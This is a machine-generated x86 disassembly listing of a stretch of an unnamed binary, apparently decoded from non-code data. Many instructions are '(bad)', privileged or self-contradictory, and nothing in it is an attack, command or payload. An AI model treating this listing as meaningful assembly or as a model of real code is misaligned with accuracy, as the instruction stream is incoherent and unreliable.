  405ff2:	fimul  DWORD PTR [esi+0x77]
  405ff5:	or     ah,BYTE PTR [edx+0x37]
  405ff8:	pop    esi
  405ff9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ffa:	jl     0x40602d
  405ffc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ffd:	sbb    DWORD PTR [esi],0x67
  406000:	iret   
  406001:	sub    ah,BYTE PTR [esi+0x76]
  406004:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406005:	xchg   edi,eax
  406006:	inc    esp
  406007:	pop    ss
  406008:	inc    ecx
  406009:	mov    ecx,0x3239cf32
  40600e:	pop    edx
  40600f:	mov    BYTE PTR [ecx+0x8bea893],bl
  406015:	lahf   
  406016:	jno    0x406030
  406018:	addr16 push ss
  40601a:	js     0x40603b
  40601c:	pop    ds
  40601d:	dec    esp
  40601e:	dec    edx
  40601f:	or     eax,0x713007d6
  406024:	pop    ebp
  406025:	loopne 0x406023
  406027:	leave  
  406028:	sub    edi,ebx
  40602a:	pop    ecx
  40602b:	jb     0x405fe7
  40602d:	dec    edx
  40602e:	sbb    bh,BYTE PTR [ecx+0xa]
  406031:	sar    DWORD PTR [eax],1
  406033:	add    al,0x86
  406035:	daa    
  406036:	mov    cl,0x13
  406038:	sti    
  406039:	mov    WORD PTR [ebp-0x2b],gs
  40603c:	sbb    eax,0x4f2a1eca
  406041:	mov    dh,0x4f
  406043:	push   ebp
  406044:	pop    DWORD PTR [edi+edx*2+0x3b90d29a]
  40604b:	sar    ah,cl
  40604d:	inc    edx
  40604e:	jae    0x405fdf
  406050:	pop    esp
  406051:	xchg   esi,eax
  406052:	jecxz  0x405ff9
  406054:	daa    
  406055:	and    BYTE PTR [edi+0x38],0xb4
  406059:	or     al,0x7f
  40605b:	fist   WORD PTR [esi+0x78]
  40605e:	cmp    edi,DWORD PTR [edi+0x5b33dc29]
  406064:	push   esi
  406065:	mov    dh,0xa
  406067:	loopne 0x4060d4
  406069:	adc    DWORD PTR [esi-0x24],0x2d
  40606d:	repnz lods al,BYTE PTR ds:[esi]
  40606f:	lods   eax,DWORD PTR ds:[esi]
  406070:	mov    al,0x6d
  406072:	das    
  406073:	pop    es
  406074:	sub    al,0x8
  406076:	cli    
  406077:	lods   eax,DWORD PTR ds:[esi]
  406078:	je     0x406001
  40607a:	ret    
  40607b:	loop   0x406070
  40607d:	cmp    BYTE PTR [esi+0x4156d46d],dh
  406083:	ror    DWORD PTR [ebp+0x20],1
  406086:	inc    esi
  406087:	or     ebx,DWORD PTR [edx+ebp*8]
  40608a:	push   ebx
  40608b:	out    dx,al
  40608c:	scas   eax,DWORD PTR es:[edi]
  40608d:	jns    0x4060c7
  40608f:	cld    
  406090:	dec    edi
  406091:	or     cl,BYTE PTR [ebp-0x2a74e022]
  406097:	mov    edi,0x2efda518
  40609c:	cld    
  40609d:	imul   esi,DWORD PTR [esi-0x49],0x68
  4060a1:	cmc    
  4060a2:	pop    edi
  4060a3:	jns    0x4060cd
  4060a5:	cmp    ebx,DWORD PTR [eax+0x35]
  4060a8:	fmul   QWORD PTR [eax+0x53ded236]
  4060ae:	adc    al,0x8f
  4060b0:	fldcw  WORD PTR [ebp-0x29]
  4060b3:	iret   
  4060b4:	xchg   esp,eax
  4060b5:	and    DWORD PTR [ebx+0x3267ed13],eax
  4060bb:	out    dx,eax
  4060bc:	dec    ebx
  4060bd:	ds jnp 0x40610f
  4060c0:	aaa    
  4060c1:	out    dx,eax
  4060c2:	cmp    eax,0xb4405993
  4060c7:	jmp    0x4060f0
  4060c9:	xchg   esi,eax
  4060ca:	sub    DWORD PTR [esi-0xe],ecx
  4060cd:	rcl    cl,cl
  4060cf:	sub    ch,BYTE PTR [ebx-0x5]
  4060d2:	fsubr  st,st(5)
  4060d4:	jp     0x406076
  4060d6:	sbb    edx,esi
  4060d8:	in     al,0x31
  4060da:	cmp    al,0xd7
  4060dd:	mov    edx,0x4c3149cc
  4060e2:	shl    ch,1
  4060e4:	xchg   DWORD PTR [edx+0x2e],edi
  4060e7:	scas   al,BYTE PTR es:[edi]
  4060e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060e9:	mov    ecx,0x1ebe3da
  4060ee:	add    ch,ah
  4060f0:	lock adc BYTE PTR [eax+0x40],bl
  4060f4:	rol    DWORD PTR [edx-0x3e9abf2c],1
  4060fa:	test   eax,0x43944588
  4060ff:	test   BYTE PTR [edx+eiz*8+0x1f],al
  406103:	inc    esp
  406104:	push   ss
  406105:	mov    esp,0x2d2594c
  40610a:	in     eax,0x94
  40610c:	cmp    eax,DWORD PTR [ebx-0x37ece845]
  406112:	pop    ebp
  406113:	into   
  406114:	fild   DWORD PTR [edi-0x7bd62427]
  40611a:	out    0x85,al
  40611c:	lods   eax,DWORD PTR ds:[esi]
  40611d:	lahf   
  40611e:	pusha  
  40611f:	pop    edx
  406120:	fwait
  406121:	mov    ebx,?
  406123:	and    al,0x45
  406125:	hlt    
  406126:	std    
  406127:	inc    edx
  406128:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40612a:	sub    eax,0xbf617a4d
  40612f:	push   ebp
  406130:	mov    ah,0x92
  406132:	pushf  
  406133:	icebp  
  406134:	push   edi
  406135:	loopne 0x40618f
  406137:	jnp    0x4060c4
  406139:	push   esp
  40613a:	cmp    BYTE PTR [esi+0x28],0xe3
  40613e:	mul    BYTE PTR [eax-0x2b]
  406141:	(bad)  
  406142:	mov    bh,0x4a
  406144:	xchg   edi,eax
  406145:	pop    esi
  406146:	pop    es
  406147:	daa    
  406148:	jnp    0x406165
  40614a:	scas   eax,DWORD PTR es:[edi]
  40614b:	test   BYTE PTR [edi-0x7f986e00],0x5
  406152:	(bad)  
  406153:	aam    0x16
  406155:	jle    0x4060e3
  406157:	icebp  
  406158:	test   eax,0xf3bb8592
  40615d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40615e:	push   ebp
  40615f:	pop    es
  406160:	int3   
  406161:	mov    dl,0x1e
  406163:	stos   DWORD PTR es:[edi],eax
  406164:	add    eax,0x200b2582
  406169:	add    DWORD PTR [esi],esi
  40616b:	sbb    al,0xba
  40616d:	mov    eax,0xc0abe6c3
  406172:	cwde   
  406173:	popa   
  406174:	bound  eax,QWORD PTR [ebx+0x28]
  406177:	sub    bl,ch
  406179:	ds out dx,eax
  40617b:	sbb    edx,DWORD PTR es:[ecx+0x8]
  40617f:	nop    DWORD PTR [ebx-0x1a]
  406183:	lock outs dx,BYTE PTR ds:[esi]
  406185:	or     esp,DWORD PTR [esi+0x71d9cdbd]
  40618b:	mov    ebp,0xfce7b647
  406190:	cmp    eax,0x153a23e8
  406195:	xor    eax,eax
  406197:	push   esp
  406198:	dec    ebp
  406199:	call   0xd5b9:0xd6d88e05
  4061a0:	push   0xffffffa5
  4061a2:	test   al,bl
  4061a4:	jge    0x40617c
  4061a6:	js     0x40612a
  4061a8:	pop    ebp
  4061a9:	imul   esi,DWORD PTR [edi+0x4f],0x79a7f978
  4061b0:	in     eax,dx
  4061b1:	stc    
  4061b2:	pop    esp
  4061b3:	sar    DWORD PTR [edx+0x37e3c65f],cl
  4061b9:	pusha  
  4061ba:	fwait
  4061bb:	xor    DWORD PTR [edx+0x2e707039],esp
  4061c1:	mov    ebx,DWORD PTR [edi-0x1ce3431c]
  4061c7:	lock pusha 
  4061c9:	xlat   BYTE PTR ds:[ebx]
  4061ca:	in     al,0x6f
  4061cc:	mov    al,0xed
  4061ce:	scas   eax,DWORD PTR es:[edi]
  4061cf:	lahf   
  4061d0:	aas    
  4061d1:	mov    edi,0xa5a4a24b
  4061d6:	aaa    
  4061d7:	add    eax,0x76c7d5b8
  4061dc:	imul   esi,DWORD PTR [eax+0x194b52db],0xffffffee
  4061e3:	cmp    cl,BYTE PTR [esi-0x71ed4862]
  4061e9:	xchg   ecx,eax
  4061ea:	push   0xffffffc5
  4061ec:	lods   al,BYTE PTR ds:[esi]
  4061ed:	loop   0x4061a4
  4061ef:	sub    BYTE PTR [ebx+0x39],0x47
  4061f3:	add    BYTE PTR [esi],cl
  4061f5:	mov    esi,esp
  4061f7:	loop   0x40625b
  4061f9:	push   0xb8d5e3f5
  4061fe:	(bad)  
  4061ff:	mov    esi,0xaf1c2c21
  406204:	retf   
  406205:	in     al,0x83
  406207:	push   ss
  406208:	pop    edx
  406209:	mov    dl,0xeb
  40620b:	cmp    eax,DWORD PTR [ebp-0x5f]
  40620e:	push   ss
  40620f:	xchg   ecx,eax
  406210:	sbb    eax,0xf8d3d04
  406215:	or     eax,0x8c31c5a0
  40621a:	test   BYTE PTR [eax],dh
  40621c:	lock push es
  40621e:	jp     0x40620a
  406220:	mov    eax,ds:0x98f4e50f
  406225:	add    bl,BYTE PTR [ecx+0x30]
  406228:	(bad)  
  406229:	xchg   ebp,eax
  40622a:	xor    BYTE PTR [edx],dl
  40622c:	and    al,0x7e
  40622e:	imul   esp,DWORD PTR [ebp-0x20],0xfffffff2
  406232:	test   eax,0x92f03dce
  406237:	mov    gs,ebp
  406239:	fldlg2 
  40623b:	mov    ds:0x50f5d262,al
  406240:	mov    eax,ds:0xf2b4cd64
  406245:	sbb    ch,BYTE PTR cs:[ecx-0x19]
  406249:	dec    esp
  40624a:	ret    
  40624b:	add    BYTE PTR [ebp+eax*2-0x42f4a9f0],ah
  406252:	js     0x406233
  406254:	push   esp
  406255:	xchg   DWORD PTR [ebp-0x44],edi
  406258:	xchg   ebx,eax
  406259:	call   0xacba8e70
  40625e:	mov    al,0x8a
  406260:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406261:	jnp    0x40621e
  406263:	in     eax,dx
  406264:	xor    BYTE PTR [edx-0x40],0x5e
  406268:	push   0xfc29d7fe
  40626d:	popf   
  40626e:	mov    eax,0x98cf134d
  406273:	cli    
  406274:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406275:	bound  eax,QWORD PTR [edx+0x585a3a97]
  40627b:	pop    ebp
  40627c:	sbb    bh,ah
  40627e:	iret   
  40627f:	fmul   DWORD PTR [edi+eax*4-0x5a]
  406283:	fwait
  406284:	nop
  406285:	ret    0xa1dc
  406288:	outs   dx,DWORD PTR ds:[esi]
  406289:	repz sbb bl,bl
  40628c:	sti    
  40628d:	lods   eax,DWORD PTR ds:[esi]
  40628e:	cmp    eax,0x879c2c6a
  406293:	pop    esp
  406294:	(bad)  
  406295:	push   ecx
  406296:	fdivr  st(7),st
  406298:	push   0xd8bc6a47
  40629d:	(bad)  
  40629e:	fbstp  TBYTE PTR [eax+0x6bd037fd]
  4062a4:	dec    edx
  4062a5:	rcr    DWORD PTR [eax],1
  4062a7:	pop    esi
  4062a8:	push   esp
  4062a9:	sub    dl,dh
  4062ab:	sbb    esi,DWORD PTR [ebp-0x29e05639]
  4062b1:	les    esi,FWORD PTR [edx]
  4062b3:	fadd   DWORD PTR [edi+0x4a]
  4062b6:	mov    ds:0x4b877f74,al
  4062bb:	push   ecx
  4062bc:	stos   BYTE PTR es:[edi],al
  4062bd:	iret   
  4062be:	push   ebx
  4062bf:	pop    eax
  4062c0:	addr16 jge 0x4062b3
  4062c3:	mov    edi,gs
  4062c5:	dec    esi
  4062c6:	(bad)  
  4062c7:	sbb    al,0x2e
  4062c9:	xchg   ecx,eax
  4062ca:	cmp    BYTE PTR [esi+eiz*2],0xa5
  4062ce:	xchg   edx,eax
  4062cf:	mov    BYTE PTR [esi+ebx*2+0x58],al
  4062d3:	mov    eax,0xe9c22b87
  4062d8:	xor    al,0x36
  4062da:	jge    0x406307
  4062dc:	lahf   
  4062dd:	add    DWORD PTR [edi+0x41],ecx
  4062e0:	xor    al,0x3a
  4062e2:	push   edi
  4062e3:	mov    dh,0x97
  4062e5:	jns    0x406308
  4062e7:	inc    eax
  4062e8:	inc    esp
  4062e9:	daa    
  4062ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4062eb:	sahf   
  4062ec:	fild   DWORD PTR [eax-0x9]
  4062ef:	fistp  WORD PTR [eax+0x65]
  4062f2:	clc    
  4062f3:	stos   BYTE PTR es:[edi],al
  4062f4:	add    bl,ah
  4062f6:	inc    BYTE PTR [esi-0x41]
  4062f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4062fa:	jae    0x406292
  4062fc:	mov    dh,0x9d
  4062fe:	into   
  4062ff:	or     ecx,edi
  406301:	jecxz  0x4062e1
  406303:	dec    esi
  406304:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406305:	sti    
  406306:	jmp    0x4062a6
  406308:	fmul   DWORD PTR [edi+0x475575c9]
  40630e:	adc    edi,esp
  406310:	loop   0x4062e2
  406312:	mov    BYTE PTR ds:0x7c7c8dde,al
  406318:	stos   BYTE PTR es:[edi],al
  406319:	iret   
  40631a:	fsub   DWORD PTR [eax+0x507c24f7]
  406320:	(bad)  
  406322:	adc    ecx,ebx
  406324:	outs   dx,BYTE PTR ds:[esi]
  406325:	leave  
  406326:	div    DWORD PTR [edx+0x4dbff75b]
  40632c:	xchg   ecx,eax
  40632e:	stos   BYTE PTR es:[edi],al
  40632f:	ds push 0x9251b4fe
  406335:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406336:	or     BYTE PTR [eax+0x2b5898d3],cl
  40633c:	jge    0x4062c2
  40633e:	jge    0x406359
  406340:	push   es
  406341:	(bad)  
  406342:	cld    
  406343:	mov    eax,0xd2a289f7
  406348:	dec    esi
  406349:	ret    0xc0b0
  40634c:	add    bl,ah
  40634e:	fistp  WORD PTR [ecx+0x29]
  406351:	jmp    0x40634f
  406353:	mov    eax,ds:0xba7824bf
  406358:	bound  ecx,QWORD PTR [ebx+eax*2-0x35]
  40635c:	add    BYTE PTR [edi],bh
  40635e:	imul   esi,ecx,0x73
  406361:	dec    eax
  406362:	clc    
  406363:	int    0x79
  406365:	or     al,0xb0
  406367:	sub    al,0x27
  406369:	icebp  
  40636a:	mov    ecx,DWORD PTR [esi-0x5be9628a]
  406370:	or     DWORD PTR [ebx+0x64],0x545ee43e
  406377:	sbb    dh,dh
  406379:	jbe    0x406398
  40637b:	(bad)  
  40637c:	nop
  40637d:	pop    ss
  40637e:	and    al,BYTE PTR ds:0x80a16613
  406384:	std    
  406385:	ss (bad) 
  406387:	dec    edx
  406388:	call   0x2f5a:0xdf44fa45
  40638f:	rol    DWORD PTR [esi],cl
  406391:	imul   ecx,DWORD PTR [ebp-0x3e],0xffffffa2
  406395:	(bad)  
  406396:	shl    BYTE PTR ds:0x3591aa09,1
  40639c:	out    dx,eax
  40639d:	sub    al,0xec
  40639f:	push   cs
  4063a0:	mov    edx,0x8ed807ad
  4063a5:	adc    ebx,ebp
  4063a7:	xchg   esp,eax
  4063a8:	mov    esp,0xaba27f5c
  4063ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4063ae:	sub    eax,0xd7c527d0
  4063b3:	retf   
  4063b4:	(bad)  
  4063b5:	adc    al,BYTE PTR [eax+0x427d5103]
  4063bb:	lods   eax,DWORD PTR ds:[esi]
  4063bc:	xchg   esi,eax
  4063bd:	xor    ah,BYTE PTR [edi+edx*4+0x35]
  4063c1:	or     ch,BYTE PTR ds:0xfc123293
  4063c7:	aam    0xfb
  4063c9:	add    esp,DWORD PTR [ecx+0x12650c84]
  4063cf:	popa   
  4063d0:	xchg   ecx,eax
  4063d1:	jp     0x4063f9
  4063d3:	jp     0x4063ce
  4063d5:	ja     0x406455
  4063d7:	xchg   ecx,eax
  4063d8:	inc    esp
  4063da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063db:	push   esi
  4063dc:	mov    eax,0xb3eac6d1
  4063e1:	cli    
  4063e2:	pop    ss
  4063e3:	(bad)  
  4063e4:	js     0x406386
  4063e6:	stc    
  4063e7:	and    ebp,ebx
  4063e9:	adc    ecx,DWORD PTR [esi]
  4063eb:	leave  
  4063ec:	ins    DWORD PTR es:[edi],dx
  4063ed:	ficomp DWORD PTR [eax]
  4063ef:	in     al,dx
  4063f0:	je     0x406439
  4063f2:	sahf   
  4063f3:	(bad)  
  4063f4:	sub    BYTE PTR [eax+0x4af7d3eb],dl
  4063fa:	sahf   
  4063fb:	ins    BYTE PTR es:[edi],dx
  4063fc:	push   esi
  4063fd:	and    eax,esi
  4063ff:	stos   BYTE PTR es:[edi],al
  406400:	ror    BYTE PTR [ecx+0x4a3ba22f],0xa4
  406407:	sar    BYTE PTR [esi],0xcb
  40640a:	mov    eax,0x81d7ade
  40640f:	ret    0x9f59
  406412:	push   ss
  406413:	push   ecx
  406414:	push   eax
  406415:	ror    eax,cl
  406417:	adc    DWORD PTR [esi+esi*4],ebp
  40641a:	test   BYTE PTR [ebx+eiz*1-0x23],ah
  40641e:	loopne 0x406469
  406420:	fcomp  st(6)
  406422:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406423:	repnz cmp eax,0xb46befd7
  406429:	sbb    al,0xd0
  40642b:	adc    BYTE PTR [edi+0x38],0x3c
  40642f:	cwde   
  406430:	xchg   edi,eax
  406431:	neg    DWORD PTR [ecx-0x10]
  406434:	das    
  406435:	push   eax
  406436:	fstp   DWORD PTR [ebx+0x60013e06]
  40643c:	fldenv [edx-0x4363ba3f]
  406442:	mov    ebx,0x6549370b
  406447:	mov    esp,0xa783b22c
  40644c:	xchg   dl,bh
  40644e:	mov    esi,0x467dbfca
  406453:	dec    esi
  406454:	lds    eax,FWORD PTR [edx+0x379e064d]
  40645a:	outs   dx,DWORD PTR ds:[esi]
  40645b:	cmp    DWORD PTR [eax-0x24],edi
  40645e:	(bad)  
  40645f:	adc    esi,DWORD PTR ds:[esi]
  406462:	dec    edx
  406463:	inc    ebx
  406464:	and    DWORD PTR ds:0x81e9f2de,esi
  40646a:	xor    edx,edx
  40646c:	jl     0x406447
  40646e:	sbb    DWORD PTR [edx],0x6b
  406471:	call   0x4372ad55
  406476:	mov    WORD PTR [eax+0x6696d682],ss
  40647c:	jnp    0x4064bb
  40647e:	pop    esp
  40647f:	sub    BYTE PTR [ecx+0x1f],cl
  406482:	addr16 fwait
  406484:	jmp    0x108a9e54
  406489:	add    ebp,edi
  40648b:	cmp    DWORD PTR [eax],ebx
  40648d:	outs   dx,BYTE PTR ds:[esi]
  40648e:	xor    dh,BYTE PTR [ebx]
  406490:	cs dec ecx
  406492:	popf   
  406493:	aam    0xee
  406495:	inc    edi
  406496:	sbb    BYTE PTR [esi+edi*2+0x1f],bl
  40649a:	data16 loope 0x406472
  40649d:	test   eax,0x58b7ae64
  4064a2:	pop    ecx
  4064a3:	and    ecx,DWORD PTR [esi+0x5a]
  4064a6:	sbb    di,WORD PTR [esi]
  4064a9:	mov    ch,0xe2
  4064ab:	retf   
  4064ac:	sbb    ecx,DWORD PTR [edi]
  4064ae:	sti    
  4064af:	retf   
  4064b0:	add    dh,BYTE PTR [edi-0x47c2756]
  4064b6:	mov    ds:0x60c77fb2,eax
  4064bb:	rcr    DWORD PTR [edi-0x12f24592],0xf6
  4064c2:	push   eax
  4064c3:	mov    ah,0x8b
  4064c5:	or     eax,0xb1099d7b
  4064ca:	inc    ecx
  4064cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4064cc:	enter  0x8fa6,0x6d
  4064d0:	(bad)  
  4064d1:	out    dx,eax
  4064d2:	push   ebp
  4064d3:	xchg   dl,dh
  4064d5:	mov    es,WORD PTR [eax+eax*2+0x3f]
  4064d9:	ficomp DWORD PTR [ecx]
  4064db:	ja     0x4064ac
  4064dd:	mov    dh,BYTE PTR [ecx-0x2c]
  4064e0:	cmp    al,0x89
  4064e2:	dec    esp
  4064e3:	pop    ebx
  4064e4:	jmp    0x4064d4
  4064e6:	jnp    0x406510
  4064e8:	leave  
  4064e9:	mov    dl,0x66
  4064eb:	add    eax,DWORD PTR [edi-0x2e463dbc]
  4064f1:	jge    0x40649e
  4064f3:	cmp    al,0xaa
  4064f5:	(bad)  
  4064f6:	ss imul esp,ecx,0xed580817
  4064fd:	and    DWORD PTR [edi+0x4b421cad],ecx
  406503:	inc    esp
  406504:	sbb    dh,BYTE PTR [edi+0x180065d8]
  40650a:	mov    dl,0xf2
  40650c:	fisub  WORD PTR [edi+0x4078ca6b]
  406512:	retf   
  406513:	push   cs
  406514:	jo     0x406542
  406516:	punpckhwd mm2,QWORD PTR [ebp-0x2b4e95c0]
  40651d:	enter  0x35c2,0x90
  406521:	jge    0x40650f
  406523:	stos   DWORD PTR es:[edi],eax
  406524:	add    edx,ebp
  406526:	xchg   edx,eax
  406527:	adc    cl,BYTE PTR [esi-0x7e84c4ff]
  40652d:	pop    edi
  40652e:	sub    eax,0xd5faf270
  406533:	jbe    0x4065a3
  406535:	in     al,0x20
  406537:	inc    eax
  406538:	enter  0xd6b9,0xaa
  40653c:	adc    al,0x33
  40653e:	bswap  ebp
  406540:	cmp    DWORD PTR [edi+edi*2],ecx
  406543:	jmp    0x4065c4
  406545:	inc    edx
  406546:	dec    edi
  406547:	jmp    0xd92e850a
  40654c:	retf   0x4168
  40654f:	fcom   DWORD PTR [esi-0x25]
  406552:	push   dx
  406554:	movd   mm5,DWORD PTR [ebp+0x4f14026]
  40655b:	cmp    dh,ah
  40655d:	jbe    0x406568
  40655f:	jg     0x40659d
  406561:	imul   DWORD PTR [ebp-0x4067a312]
  406567:	or     al,0xf6
  406569:	(bad)  
  40656a:	xchg   edi,eax
  40656b:	mov    DWORD PTR [edx+edx*8+0x3d],eax
  40656f:	cs push edi
  406571:	pop    ebp
  406572:	pop    eax
  406573:	fimul  DWORD PTR [edx+0x67467d45]
  406579:	add    ecx,DWORD PTR ds:0xe4123d3b
  40657f:	sar    BYTE PTR [esi+0x72],1
  406582:	sti    
  406583:	ss ret 
  406585:	jns    0x406600
  406587:	inc    edx
  406588:	or     ebx,DWORD PTR [edi+0x7c]
  40658b:	call   0xaa59f5f5
  406590:	test   eax,0x77d02308
  406595:	cdq    
  406596:	fwait
  406597:	xchg   edx,eax
  406598:	fmul   QWORD PTR [esi]
  40659a:	jle    0x406607
  40659c:	icebp  
  40659d:	icebp  
  40659e:	xchg   DWORD PTR [ecx+0x4e9d8e04],edx
  4065a4:	fwait
  4065a5:	sahf   
  4065a6:	loop   0x406605
  4065a8:	(bad)  
  4065a9:	jno    0x406623
  4065ab:	or     ecx,esp
  4065ad:	ins    BYTE PTR es:[edi],dx
  4065ae:	jle    0x4065b6
  4065b0:	inc    ebx
  4065b1:	push   eax
  4065b2:	(bad)  
  4065b4:	daa    
  4065b5:	ds pop eax
  4065b7:	add    dl,BYTE PTR [ebx]
  4065b9:	push   edi
  4065ba:	mov    ds:0xdb80aa35,eax
  4065bf:	adc    al,0x45
  4065c1:	mul    dl
  4065c3:	xlat   BYTE PTR ds:[ebx]
  4065c4:	jbe    0x40663c
  4065c6:	mov    dh,0xce
  4065c8:	mov    eax,ds:0x86d86e30
  4065cd:	mov    ah,0x7b
  4065cf:	fstp   QWORD PTR [ebx-0x407dd42]
  4065d5:	dec    eax
  4065d6:	rcl    edx,1
  4065d8:	mov    edi,DWORD PTR [eax+0x2f7ebf36]
  4065de:	xchg   ebx,eax
  4065df:	aaa    
  4065e0:	xchg   esi,eax
  4065e1:	das    
  4065e2:	or     BYTE PTR [ebx],cl
  4065e4:	lods   eax,DWORD PTR ds:[esi]
  4065e5:	fcmovnu st,st(5)
  4065e7:	mov    WORD PTR [esp+edx*2],cs
  4065ea:	cmp    cl,BYTE PTR [edx-0xa]
  4065ed:	mov    edi,0x88463c37
  4065f2:	xor    edi,esp
  4065f4:	fwait
  4065f5:	dec    ebp
  4065f6:	mov    bh,0x5a
  4065f8:	mov    ds:0x54c08995,eax
  4065fd:	fsubr  DWORD PTR [esi+eiz*8+0x13]
  406601:	aas    
  406602:	(bad)  
  406604:	sub    BYTE PTR [eax],cl
  406606:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406607:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406608:	jg     0x406627
  40660a:	stos   DWORD PTR es:[edi],eax
  40660b:	mov    ds:0x7d3ac226,al
  406610:	add    ecx,DWORD PTR [esi-0x9]
  406613:	sub    dl,dh
  406615:	bnd jp 0x406662
  406618:	xchg   ebp,eax
  406619:	pop    ds
  40661a:	or     al,0x4b
  40661c:	loope  0x4065b6
  40661e:	lods   eax,DWORD PTR ds:[esi]
  40661f:	loope  0x4065e4
  406621:	dec    esp
  406622:	jo     0x4065cd
  406624:	mov    ds:0x90d2dcbd,al
  406629:	push   es
  40662a:	stc    
  40662b:	ins    DWORD PTR es:[edi],dx
  40662c:	pop    esp
  40662d:	sub    al,0xc2
  40662f:	mov    esp,0x6c5106b4
  406634:	jecxz  0x4066a9
  406636:	dec    ecx
  406637:	pop    ecx
  406638:	adc    ebx,ebx
  40663a:	mov    WORD PTR [ecx-0x5ce20f79],fs
  406640:	rcl    BYTE PTR [esi],0xa
  406643:	fidiv  WORD PTR [edi]
  406645:	loope  0x4066b9
  406647:	outs   dx,DWORD PTR ds:[esi]
  406648:	push   ss
  406649:	popa   
  40664a:	in     eax,dx
  40664b:	push   cs
  40664c:	jl     0x1192dd97
  406652:	cmc    
  406653:	addps  xmm3,XMMWORD PTR [ebx]
  406656:	call   0xd6269858
  40665b:	sbb    DWORD PTR [esi+0x218de8e5],esp
  406661:	ficomp WORD PTR [ebx+0x7e]
  406664:	test   BYTE PTR [esi+0x18],cl
  406667:	into   
  406668:	rcl    DWORD PTR [ecx+edi*1+0x53],1
  40666c:	iret   
  40666d:	inc    eax
  40666e:	mov    BYTE PTR [eax],bl
  406670:	inc    edi
  406671:	test   BYTE PTR [ecx+ecx*1+0x21],dl
  406675:	addr16 mov al,al
  406678:	pop    ss
  406679:	xlat   BYTE PTR ds:[ebx]
  40667a:	lods   al,BYTE PTR ds:[esi]
  40667b:	or     DWORD PTR [ecx+0x1b08a7ef],ebp
  406681:	div    dl
  406683:	pop    es
  406684:	test   eax,0xc23f6e95
  406689:	test   BYTE PTR [edx+0x7ed91ee7],bl
  40668f:	mov    ds:0x1ee8a774,eax
  406694:	sti    
  406695:	rcl    ebx,1
  406697:	xchg   esi,eax
  406698:	ins    DWORD PTR es:[di],dx
  40669a:	les    ebx,FWORD PTR [eax+edx*8+0xb1c66c0]
  4066a1:	sub    ebx,DWORD PTR [esp+ebx*8+0x1baac9f1]
  4066a8:	ja     0x4066e3
  4066aa:	push   es
  4066ab:	cmp    ebx,DWORD PTR [edx+0x73]
  4066ae:	or     BYTE PTR [eax-0x78bb2576],0x95
  4066b5:	retf   0x8df
  4066b8:	jo     0x40670b
  4066ba:	sti    
  4066bb:	leave  
  4066bc:	add    ah,dl
  4066be:	mov    eax,0x8231480d
  4066c3:	mov    bl,0xe0
  4066c5:	sub    bl,BYTE PTR [ebp+eiz*4-0x34]
  4066c9:	jne    0x4066f3
  4066cb:	push   ebx
  4066cc:	adc    al,0x1d
  4066ce:	push   ecx
  4066cf:	fist   WORD PTR [ebx+0x5185f06c]
  4066d5:	pop    edi
  4066d6:	inc    ecx
  4066d7:	out    0x9d,al
  4066d9:	mov    bl,0xc3
  4066db:	add    BYTE PTR [esi+ebx*4+0x57],bl
  4066df:	sbb    esp,DWORD PTR [eax]
  4066e1:	rcr    DWORD PTR [eax+0x29],1
  4066e4:	test   BYTE PTR [ecx-0x44],bh
  4066e7:	cmp    esi,ebx
  4066e9:	cli    
  4066ea:	jnp    0x4066cb
  4066ec:	das    
  4066ed:	inc    BYTE PTR [edx+esi*2-0x2a]
  4066f1:	sbb    esp,DWORD PTR [eax-0x5d0c8bb8]
  4066f7:	jge    0x406683
  4066f9:	pop    edx
  4066fa:	dec    eax
  4066fb:	push   es
  4066fc:	ffree  st(5)
  4066fe:	imul   BYTE PTR [esi-0x50]
  406701:	scas   eax,DWORD PTR es:[edi]
  406702:	int    0x92
  406704:	(bad)  
  406705:	sbb    ah,BYTE PTR [esi+0x57]
  406708:	pop    esi
  406709:	addr16 aad 0xe3
  40670c:	je     0x4066aa
  40670e:	mov    ecx,0x996c7589
  406713:	and    esi,edi
  406715:	daa    
  406716:	adc    DWORD PTR [ebp-0x7f],ebp
  406719:	inc    eax
  40671a:	push   0x76
  40671c:	vpsubusw ymm5,ymm6,YMMWORD PTR [ebx+0x4c]
  406721:	rcr    bl,0xe6
  406724:	and    BYTE PTR [edi+0x22],ch
  406727:	ins    DWORD PTR es:[edi],dx
  406728:	jno    0x4067a7
  40672a:	std    
  40672b:	cmp    BYTE PTR gs:[ebx],ch
  40672e:	sub    cl,ah
  406730:	fadd   DWORD PTR [ebp+0x5a]
  406733:	data16 test BYTE PTR [edi],dl
  406736:	cmp    eax,0xaf6063a3
  40673b:	add    BYTE PTR [ebx+eiz*8],bh
  40673e:	std    
  40673f:	pop    es
  406740:	cs xchg edx,eax
  406742:	aas    
  406743:	xlat   BYTE PTR ds:[ebx]
  406744:	cmp    bh,BYTE PTR [ecx+0x3e]
  406747:	dec    edx
  406748:	adc    ch,BYTE PTR [ebx-0x50]
  40674b:	pop    eax
  40674c:	inc    edi
  40674d:	dec    ecx
  40674e:	imul   BYTE PTR [edx]
  406750:	retf   0xf8e1
  406753:	inc    edi
  406754:	inc    ebp
  406755:	hlt    
  406756:	jmp    0xe2d4:0x4c9e0bbe
  40675d:	pop    edx
  40675e:	(bad)  
  40675f:	pop    ebp
  406760:	jae    0x406739
  406762:	stos   BYTE PTR es:[edi],al
  406763:	lods   al,BYTE PTR ds:[esi]
  406764:	pop    esi
  406765:	xor    ebp,ebp
  406767:	mov    ?,WORD PTR [esi]
  406769:	xchg   esi,eax
  40676a:	mov    ds:0xc4aac5aa,eax
